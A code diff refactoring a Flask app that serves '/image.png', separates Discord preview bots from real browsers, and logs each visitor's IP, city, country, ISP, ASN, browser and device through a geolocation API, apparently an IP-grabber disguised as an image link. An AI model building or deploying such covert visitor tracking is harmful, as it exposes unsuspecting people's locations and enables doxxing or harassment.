@@ -4,13 +4,19 @@ from user_agents import parse
 from ipaddress import ip_address
 import requests
 import logging
+import os
+import sys
 
 app = Flask(__name__)
 
 logging.basicConfig(
     level=logging.INFO,
-    format="%(message)s"
+    format="%(message)s",
+    stream=sys.stdout,
+    force=True
 )
+
+app.logger.setLevel(logging.INFO)
 
 GEO_API = "http://ip-api.com/json/"
 GEO_FIELDS = "status,country,city,isp,as"
@@ -18,11 +24,12 @@ TRUST_PROXY_HEADERS = False
 
 
 def get_client_ip():
+    candidate = request.remote_addr
+
     if TRUST_PROXY_HEADERS:
         forwarded = request.headers.get("X-Forwarded-For", "")
-        candidate = forwarded.split(",")[0].strip() if forwarded else request.remote_addr
-    else:
-        candidate = request.remote_addr
+        if forwarded:
+            candidate = forwarded.split(",")[0].strip()
 
     if not candidate:
         return "Unknown"
@@ -34,16 +41,18 @@ def get_client_ip():
 
 
 def get_ip_info(ip):
+    unavailable = {
+        "country": "Unavailable",
+        "city": "Unavailable",
+        "isp": "Unavailable",
+        "asn": "Unavailable",
+    }
+
     try:
         parsed_ip = ip_address(ip)
 
         if not parsed_ip.is_global:
-            return {
-                "country": "Unavailable",
-                "city": "Unavailable",
-                "isp": "Unavailable",
-                "asn": "Unavailable",
-            }
+            return unavailable
 
         response = requests.get(
             f"{GEO_API}{ip}",
@@ -54,7 +63,7 @@ def get_ip_info(ip):
         data = response.json()
 
         if data.get("status") != "success":
-            raise ValueError("Geolocation lookup failed")
+            return unavailable
 
         return {
             "country": data.get("country") or "Unknown",
@@ -64,12 +73,7 @@ def get_ip_info(ip):
         }
 
     except (requests.RequestException, ValueError):
-        return {
-            "country": "Unavailable",
-            "city": "Unavailable",
-            "isp": "Unavailable",
-            "asn": "Unavailable",
-        }
+        return unavailable
 
 
 def log_request(is_discord=False):
@@ -77,7 +81,7 @@ def log_request(is_discord=False):
     info = get_ip_info(ip)
 
     if is_discord:
-        logging.info("[LOG] Discord Bot Detected")
+        app.logger.info("[LOG] Discord Bot Detected (no browser info)")
     else:
         ua_string = request.headers.get("User-Agent", "")
         ua = parse(ua_string)
@@ -87,26 +91,33 @@ def log_request(is_discord=False):
             if ua.browser.family != "Other"
             else "Unknown"
         )
+
         os_name = (
             f"{ua.os.family} {ua.os.version_string}"
             if ua.os.family != "Other"
             else "Unknown"
         )
+
         device = ua.device.family or "Unknown"
 
-        logging.info(
+        app.logger.info(
             f"[LOG] User Browser Detected "
             f"(Browser: {browser} | OS: {os_name} | Device: {device})"
         )
 
-    logging.info(f" IP: {ip}")
-    logging.info(f" Country/City: {info['country']} / {info['city']}")
-    logging.info(f" ISP: {info['isp']}")
-    logging.info(f" ASN: {info['asn']}")
+    app.logger.info(f" IP: {ip}")
+    app.logger.info(f" Country/City: {info['country']} / {info['city']}")
+    app.logger.info(f" ISP: {info['isp']}")
+    app.logger.info(f" ASN: {info['asn']}")
 
 
 def is_uptime_robot():
     return "UptimeRobot" in request.headers.get("User-Agent", "")
+
+
+@app.route("/")
+def home():
+    return "OK", 200
 
 
 @app.route("/image.png")
@@ -140,4 +151,5 @@ def separate_log_behavior():
 
 
 if __name__ == "__main__":
-    app.run(host="0.0.0.0", port=80)
+    port = int(os.environ.get("PORT", 10000))
+    app.run(host="0.0.0.0", port=port)
